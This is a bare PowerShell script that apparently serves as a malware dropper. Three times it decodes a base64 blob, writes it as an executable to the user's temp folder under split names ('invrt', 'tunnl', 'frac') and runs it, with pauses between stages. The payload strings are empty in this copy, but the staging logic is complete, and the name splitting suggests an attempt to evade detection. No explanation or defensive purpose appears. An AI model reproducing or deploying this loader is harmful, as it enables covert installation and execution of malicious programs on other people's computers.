$b64 = ''
$decodedFile = [System.Convert]::FromBase64String($b64)
$File3 = "$env:temp/invrt"+".exe"
Set-Content -Path $File3 -Value $decodedFile -Encoding Byte
& $File3

Sleep 20

$b64 = ''
$decodedFile = [System.Convert]::FromBase64String($b64)
$File4 = "$env:temp/tunnl"+".exe"
Set-Content -Path $File4 -Value $decodedFile -Encoding Byte
& $File4

Sleep 30

$b64 = ''
$decodedFile = [System.Convert]::FromBase64String($b64)
$File5 = "$env:temp/frac"+".exe"
Set-Content -Path $File5 -Value $decodedFile -Encoding Byte
& $File5

